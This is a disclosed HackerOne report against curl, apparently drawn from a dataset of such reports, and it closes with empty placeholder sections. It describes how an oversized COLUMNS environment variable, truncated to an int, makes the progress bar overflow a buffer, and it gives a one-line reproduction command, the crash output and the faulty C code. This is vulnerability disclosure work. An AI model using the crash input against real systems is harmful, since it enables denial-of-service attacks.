---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '636013'
original_report_id: '636013'
title: huge COLUMNS causes progress-bar to buffer overflow
weakness: Classic Buffer Overflow
team_handle: curl
created_at: '2019-07-04T23:24:45.720Z'
disclosed_at: '2021-02-08T07:55:53.496Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 1
asset_identifier: https://github.com/curl/curl
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- classic-buffer-overflow
---

# huge COLUMNS causes progress-bar to buffer overflow

## Metadata

- HackerOne Report ID: 636013
- Weakness: Classic Buffer Overflow
- Program: curl
- Disclosed At: 2021-02-08T07:55:53.496Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

## Summary:
If an attacker can set environmental variables, curl will always crash with a buffer overflow when downloading a file &ndash; if the `--progress-bar` argument is set.

## Steps To Reproduce:
Just run the following command on a **64-bit Linux** system (verified on Ubuntu 19.04).

```bash
# Of course you can set the COLUMNS variable in your `.profile` configuration file instead...
env COLUMNS="9223372032559808515" curl "http://hubblesource.stsci.edu/sources/video/clips/details/images/hale_bopp_2.mpg" -o "./test.mpg"
```

**Output**
```
      23,0%*** buffer overfow detected ***: curl terminated
Aborted (core dumped)
```

**Explanation of the bug**
The `progress-bar` feature parses the `COLUMNS` environment variable. The source code aims to guarantee this value to be above 20. However, on Linux systems this check fails due to a faulty integer cast in `tool_cb_prg.c`:

```c
colp = curlx_getenv("COLUMNS");
if(colp) {
     char *endptr;
     long num = strtol(colp, &endptr, 10);
     // Our value of 9223372032559808515 will be OK!
     if((endptr != colp) && (endptr == colp + strlen(colp)) && (num > 20))
         // BUG! Back to int... 9223372032559808515 becomes 3.
         bar->width = (int)num;
```

Then on **line 181** we have the buffer overflow:

```c
    barwidth = bar->width - 7; // HERE we get 3-7 resulting in...
    num = (int) (((double)barwidth) * frac);
    if(num > MAX_BARLENGTH)
      num = MAX_BARLENGTH;
    memset(line, '#', num); // .... a crazy high value here!
```

## Impact

**If** a server runs `curl` with the `--progress-bar` argument set **and** (intentionally or unintentionally) allows an attacker to set environmental variables, the server could easily become a victim of a DoS attack.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
